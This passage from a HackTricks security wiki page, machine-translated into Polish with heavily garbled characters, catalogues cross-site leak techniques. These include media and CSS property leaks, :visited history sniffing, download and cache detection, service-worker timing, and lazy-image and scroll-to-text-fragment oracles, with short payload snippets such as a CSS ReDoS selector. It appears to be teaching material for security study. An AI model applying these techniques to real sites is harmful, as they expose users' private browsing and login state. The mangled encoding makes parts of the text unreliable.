* **Wykrywalna r贸偶nica**: Zawarto strony
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Podsumowanie:** Odczytaj ujawnion warto, aby rozr贸偶ni midzy 2 mo偶liwymi stanami
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Ujawnienie informacji przez elementy HTML jest problemem w bezpieczestwie sieci, szczeg贸lnie gdy dynamiczne pliki multimedialne s generowane na podstawie informacji o u偶ytkowniku lub gdy dodawane s znaki wodne, zmieniajc rozmiar multimedi贸w. Mo偶e to by wykorzystywane przez atakujcych do rozr贸偶nienia midzy mo偶liwymi stanami, analizujc informacje ujawnione przez niekt贸re elementy HTML.

### Informacje ujawnione przez elementy HTML

* **HTMLMediaElement**: Ten element ujawnia `duration` i `buffered` czasy multimedi贸w, kt贸re mo偶na uzyska za pomoc jego API. [Przeczytaj wicej o HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: Ujawnia `videoHeight` i `videoWidth`. W niekt贸rych przegldarkach dostpne s dodatkowe waciwoci, takie jak `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` i `webkitDecodedFrameCount`, oferujce bardziej szczeg贸owe informacje o zawartoci multimedialnej. [Przeczytaj wicej o HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: Ta funkcja dostarcza szczeg贸y dotyczce jakoci odtwarzania wideo, w tym `totalVideoFrames`, co mo偶e wskazywa na ilo przetworzonych danych wideo. [Przeczytaj wicej o getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: Ten element ujawnia `height` i `width` obrazu. Jednak jeli obraz jest nieprawidowy, te waciwoci zwr贸c 0, a funkcja `image.decode()` zostanie odrzucona, co wskazuje na niepowodzenie w poprawnym zaadowaniu obrazu. [Przeczytaj wicej o HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### Waciwo CSS

* **Metody wczenia**: Elementy HTML
* **Wykrywalna r贸偶nica**: Zawarto strony
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Podsumowanie:** Zidentyfikuj r贸偶nice w stylizacji strony internetowej, kt贸re koreluj ze stanem lub statusem u偶ytkownika.
* **Przykad kodu**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Aplikacje internetowe mog zmienia stylizacj **strony internetowej w zale偶noci od statusu u偶ytkownika**. Pliki CSS z r贸偶nych 藕r贸de mog by osadzone na stronie atakujcego za pomoc **elementu link HTML**, a **reguy** bd **zastosowane** do strony atakujcego. Jeli strona dynamicznie zmienia te reguy, atakujcy mo偶e **wykry** te **r贸偶nice** w zale偶noci od stanu u偶ytkownika.\
Jako technik wycieku, atakujcy mo偶e u偶y metody `window.getComputedStyle`, aby **odczyta waciwoci CSS** konkretnego elementu HTML. W rezultacie atakujcy mo偶e odczyta dowolne waciwoci CSS, jeli znana jest nazwa elementu i waciwoci.

### Historia CSS

* **Metody wczenia**: Elementy HTML
* **Wykrywalna r贸偶nica**: Zawarto strony
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Podsumowanie:** Wykryj, czy styl `:visited` jest zastosowany do URL, co wskazuje, 偶e by ju偶 odwiedzany
* **Przykad kodu**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Zgodnie z [**tym**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), to nie dziaa w headless Chrome.
{% endhint %}

Selektor CSS `:visited` jest wykorzystywany do stylizacji URL w inny spos贸b, jeli byy wczeniej odwiedzane przez u偶ytkownika. W przeszoci metoda `getComputedStyle()` moga by u偶ywana do identyfikacji tych r贸偶nic w stylu. Jednak nowoczesne przegldarki wprowadziy rodki bezpieczestwa, aby zapobiec ujawnieniu stanu linku przez t metod. rodki te obejmuj zawsze zwracanie stylu obliczonego, jakby link by odwiedzany, oraz ograniczenie styl贸w, kt贸re mog by stosowane z selektorem `:visited`.

Mimo tych ogranicze, mo偶liwe jest porednie rozr贸偶nienie stanu odwiedzenia linku. Jedna z technik polega na oszukaniu u偶ytkownika, aby interagowa z obszarem dotknitym przez CSS, wykorzystujc waciwo `mix-blend-mode`. Ta waciwo pozwala na mieszanie element贸w z ich tem, co potencjalnie ujawnia stan odwiedzenia na podstawie interakcji u偶ytkownika.

Ponadto, wykrycie mo偶na osign bez interakcji u偶ytkownika, wykorzystujc czasy renderowania link贸w. Poniewa偶 przegldarki mog renderowa odwiedzone i nieodwiedzone linki w r贸偶ny spos贸b, mo偶e to wprowadzi mierzaln r贸偶nic czasow w renderowaniu. Dow贸d koncepcji (PoC) zosta wspomniany w raporcie bdu Chromium, demonstrujc t technik przy u偶yciu wielu link贸w, aby wzmocni r贸偶nic czasow, co sprawia, 偶e stan odwiedzenia jest wykrywalny poprzez analiz czasu.

Aby uzyska wicej szczeg贸贸w na temat tych waciwoci i metod, odwied藕 ich strony dokumentacji:

* `:visited`: [Dokumentacja MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
* `getComputedStyle()`: [Dokumentacja MDN](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
* `mix-blend-mode`: [Dokumentacja MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### Wycieki X-Frame ContentDocument

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: Nag贸wki
* **Wicej informacji**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Podsumowanie:** W Google Chrome wywietlana jest dedykowana strona bdu, gdy strona jest zablokowana przed osadzeniem na stronie z innego 藕r贸da z powodu ogranicze X-Frame-Options.
* **Przykad kodu**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

W Chrome, jeli strona z nag贸wkiem `X-Frame-Options` ustawionym na "deny" lub "same-origin" jest osadzona jako obiekt, pojawia si strona bdu. Chrome unikalnie zwraca pusty obiekt dokumentu (zamiast `null`) dla waciwoci `contentDocument` tego obiektu, w przeciwiestwie do iframe'贸w lub innych przegldarek. Atakujcy mog to wykorzysta, wykrywajc pusty dokument, co mo偶e ujawnia informacje o stanie u偶ytkownika, szczeg贸lnie jeli deweloperzy niesp贸jnie ustawiaj nag贸wek X-Frame-Options, czsto pomijajc strony bd贸w. wiadomo i konsekwentne stosowanie nag贸wk贸w bezpieczestwa s kluczowe dla zapobiegania takim wyciekom.

### Wykrywanie pobierania

* **Metody wczenia**: Ramki, Pop-upy
* **Wykrywalna r贸偶nica**: Nag贸wki
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Podsumowanie:** Atakujcy mo偶e rozpozna pobieranie plik贸w, wykorzystujc iframe; ciga dostpno iframe sugeruje pomylne pobranie pliku.
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

Nag贸wek `Content-Disposition`, szczeg贸lnie `Content-Disposition: attachment`, instruuje przegldark, aby pobraa zawarto zamiast wywietla j w linii. To zachowanie mo偶e by wykorzystywane do wykrywania, czy u偶ytkownik ma dostp do strony, kt贸ra wywouje pobieranie pliku. W przegldarkach opartych na Chromium istnieje kilka technik wykrywania tego zachowania pobierania:

1. **Monitorowanie paska pobierania**:
* Gdy plik jest pobierany w przegldarkach opartych na Chromium, pasek pobierania pojawia si na dole okna przegldarki.
* Monitorujc zmiany w wysokoci okna, atakujcy mog wnioskowa o pojawieniu si paska pobierania, co sugeruje, 偶e pobieranie zostao zainicjowane.
2. **Nawigacja pobierania z iframe'ami**:
* Gdy strona wywouje pobieranie pliku za pomoc nag贸wka `Content-Disposition: attachment`, nie powoduje to zdarzenia nawigacji.
* adujc zawarto w iframe i monitorujc zdarzenia nawigacji, mo偶na sprawdzi, czy rozkad treci powoduje pobieranie pliku (brak nawigacji) czy nie.
3. **Nawigacja pobierania bez iframe'贸w**:
* Podobnie jak w technice iframe, ta metoda polega na u偶yciu `window.open` zamiast iframe.
* Monitorowanie zdarze nawigacji w nowo otwartym oknie mo偶e ujawni, czy wywoano pobieranie pliku (brak nawigacji) czy zawarto jest wywietlana w linii (nastpuje nawigacja).

W scenariuszach, w kt贸rych tylko zalogowani u偶ytkownicy mog wywoa takie pobierania, te techniki mog by u偶ywane do poredniego wnioskowania o stanie uwierzytelnienia u偶ytkownika na podstawie odpowiedzi przegldarki na 偶danie pobrania.

### Ominicie podzielonej pamici podrcznej HTTP <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Metody wczenia**: Pop-upy
* **Wykrywalna r贸偶nica**: Czas
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Podsumowanie:** Atakujcy mo偶e rozpozna pobieranie plik贸w, wykorzystujc iframe; ciga dostpno iframe sugeruje pomylne pobranie pliku.
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (z [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Dlatego ta technika jest interesujca: Chrome ma teraz **podzia pamici podrcznej**, a klucz pamici podrcznej nowo otwartej strony to: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`, ale jeli otworz stron ngrok i u偶yj fetch w niej, klucz pamici podrcznej bdzie: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, **klucz pamici podrcznej jest inny**, wic pami podrczna nie mo偶e by dzielona. Mo偶esz znale藕 wicej szczeg贸贸w tutaj: [Zyskiwanie bezpieczestwa i prywatnoci przez podzia pamici podrcznej](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Komentarz z [**tutaj**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Jeli strona `example.com` zawiera zas贸b z `*.example.com/resource`, to ten zas贸b bdzie mia **ten sam klucz pamici podrcznej**, jakby zas贸b by bezporednio **偶dany przez nawigacj na najwy偶szym poziomie**. To dlatego, 偶e klucz pamici podrcznej skada si z najwy偶szego poziomu _eTLD+1_ i ramki _eTLD+1_.

Poniewa偶 dostp do pamici podrcznej jest szybszy ni偶 adowanie zasobu, mo偶liwe jest pr贸bowanie zmiany lokalizacji strony i anulowanie jej 20 ms (na przykad) p贸藕niej. Jeli pochodzenie zostao zmienione po zatrzymaniu, oznacza to, 偶e zas贸b zosta zbuforowany.\
Mo偶na r贸wnie偶 **wysa jakie fetch do potencjalnie zbuforowanej strony i zmierzy czas, jaki to zajmuje**.

### Rczne przekierowanie <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Metody wczenia**: Fetch API
* **Wykrywalna r贸偶nica**: Przekierowania
* **Wicej informacji**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Podsumowanie:** Mo偶liwe jest ustalenie, czy odpowied藕 na 偶danie fetch jest przekierowaniem
* **Przykad kodu**:

![](<../.gitbook/assets/image (652).png>)

### Fetch z AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Metody wczenia**: Fetch API
* **Wykrywalna r贸偶nica**: Czas
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Podsumowanie:** Mo偶liwe jest pr贸bowanie zaadowania zasobu i przerwanie adowania przed jego zaadowaniem. W zale偶noci od tego, czy wystpi bd, zas贸b by lub nie by zbuforowany.
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

U偶yj _**fetch**_ i _**setTimeout**_ z **AbortController**, aby wykry, czy **zas贸b jest zbuforowany** i aby usun konkretny zas贸b z pamici podrcznej przegldarki. Ponadto proces ten odbywa si bez buforowania nowej zawartoci.

### Zanieczyszczenie skryptu

* **Metody wczenia**: Elementy HTML (skrypt)
* **Wykrywalna r贸偶nica**: Zawarto strony
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Podsumowanie:** Mo偶liwe jest **nadpisanie wbudowanych funkcji** i odczytanie ich argument贸w, nawet z **skryptu z innego 藕r贸da** (kt贸rego nie mo偶na odczyta bezporednio), co mo偶e **ujawnia cenne informacje**.
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Pracownicy serwisowi <a href="#service-workers" id="service-workers"></a>

* **Metody wczenia**: Pop-upy
* **Wykrywalna r贸偶nica**: Zawarto strony
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Podsumowanie:** Mierz czas wykonania strony internetowej za pomoc pracownik贸w serwisowych.
* **Przykad kodu**:

W danym scenariuszu atakujcy podejmuje inicjatyw, aby zarejestrowa **pracownika serwisowego** w jednej ze swoich domen, konkretnie "attacker.com". Nastpnie atakujcy otwiera nowe okno na stronie docelowej z g贸wnego dokumentu i instruuje **pracownika serwisowego**, aby rozpocz timer. Gdy nowe okno zaczyna si adowa, atakujcy nawiguj odniesienie uzyskane w poprzednim kroku do strony zarzdzanej przez **pracownika serwisowego**.

Po przybyciu 偶dania zainicjowanego w poprzednim kroku, **pracownik serwisowy** odpowiada kodem statusu **204 (No Content)**, skutecznie koczc proces nawigacji. W tym momencie **pracownik serwisowy** rejestruje pomiar z timera uruchomionego wczeniej w kroku drugim. Ten pomiar jest wpywany przez czas trwania JavaScript, powodujc op贸藕nienia w procesie nawigacji.

{% hint style="warning" %}
W pomiarze czasu wykonania mo偶liwe jest **eliminowanie** **czynnik贸w sieciowych**, aby uzyska **dokadniejsze pomiary**. Na przykad, adujc zasoby u偶ywane przez stron przed jej zaadowaniem.
{% endhint %}

### Czas pobierania

* **Metody wczenia**: Fetch API
* **Wykrywalna r贸偶nica**: Czas (og贸lnie z powodu zawartoci strony, kodu statusu)
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Podsumowanie:** U偶yj [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow), aby zmierzy czas potrzebny na wykonanie 偶dania. Inne zegary mog by u偶ywane.
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Czas midzy oknami

* **Metody wczenia**: Pop-upy
* **Wykrywalna r贸偶nica**: Czas (og贸lnie z powodu zawartoci strony, kodu statusu)
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Podsumowanie:** U偶yj [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow), aby zmierzy czas potrzebny na wykonanie 偶dania za pomoc `window.open`. Inne zegary mog by u偶ywane.
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
U偶yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby atwo budowa i **automatyzowa przepywy pracy** zasilane przez **najbardziej zaawansowane** narzdzia spoecznociowe.\
Uzyskaj dostp ju偶 dzi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Z HTML lub ponowna iniekcja

Tutaj znajdziesz techniki eksfiltracji informacji z HTML z innego 藕r贸da **poprzez wstrzykiwanie treci HTML**. Te techniki s interesujce w przypadkach, gdy z jakiego powodu mo偶esz **wstrzykiwa HTML, ale nie mo偶esz wstrzykiwa kodu JS**.

### Zawieszone znaczniki

{% content-ref url="dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### adowanie obraz贸w leniwie

Jeli musisz **eksfiltracja treci** i mo偶esz **doda HTML przed sekretem**, powiniene sprawdzi **powszechne techniki zawieszonych znacznik贸w**.\
Jednak jeli z jakiego powodu **MUSISZ** to zrobi **znak po znaku** (mo偶e komunikacja odbywa si przez trafienie w pamici podrcznej), mo偶esz u偶y tego triku.

**Obrazy** w HTML maj atrybut "**loading**", kt贸rego warto mo偶e by "**lazy**". W takim przypadku obraz zostanie zaadowany, gdy bdzie wywietlany, a nie podczas adowania strony:
```html
<img src=/something loading=lazy >
```
Dlatego, co mo偶esz zrobi, to **doda du偶o mieciowych znak贸w** (na przykad **tysice "W"**) aby **wypeni stron internetow przed sekretem lub doda co takiego jak** `<br><canvas height="1850px"></canvas><br>.`\
Wtedy, jeli na przykad nasza **iniekcja pojawi si przed flag**, **obraz** zostanie **zaadowany**, ale jeli pojawi si **po** **fladze**, flaga + mieci **uniemo偶liwi jej zaadowanie** (bdziesz musia eksperymentowa z iloci mieci do umieszczenia). To si wydarzyo w [**tym opisie**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Inn opcj byoby u偶ycie **scroll-to-text-fragment**, jeli jest to dozwolone:

#### Scroll-to-text-fragment

Jednak sprawiasz, 偶e **bot uzyskuje dostp do strony** z czym takim jak
```
#:~:text=SECR
```
So the web page will be something like: **`https://victim.com/post.html#:~:text=SECR`**

Gdzie post.html zawiera mieciowe znaki atakujcego i obrazek adowany leniwie, a nastpnie dodawany jest sekret bota.

Co ten tekst zrobi, to sprawi, 偶e bot uzyska dostp do dowolnego tekstu na stronie, kt贸ry zawiera tekst `SECR`. Poniewa偶 ten tekst jest sekretem i jest **tu偶 poni偶ej obrazu**, **obraz zaaduje si tylko, jeli odgadnity sekret jest poprawny**. Tak wic masz swoje oracle do **ekstrahowania sekretu znak po znaku**.

Some code example to exploit this: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Image Lazy Loading Time Based

If it's **not possible to load an external image** that could indicate the attacker that the image was loaded, another option would be to try to **guess the char several times and measure that**. Jeli obraz jest adowany, wszystkie 偶dania bd trway du偶ej ni偶 w przypadku, gdy obraz nie jest adowany. To jest to, co zostao u偶yte w [**rozwizaniu tego opisu**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **podsumowanym tutaj:**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

If `jQuery(location.hash)` is used, it's possible to find out via timing i**f some HTML content exists**, to dlatego, 偶e jeli selektor `main[id='site-main']` nie pasuje, nie trzeba sprawdza reszty **selektor贸w**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSS Injection

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## Defenses

Zalecane s rodki zaradcze w [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) oraz w ka偶dej sekcji wiki [https://xsleaks.dev/](https://xsleaks.dev/). Zobacz tam wicej informacji na temat ochrony przed tymi technikami.

## References

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
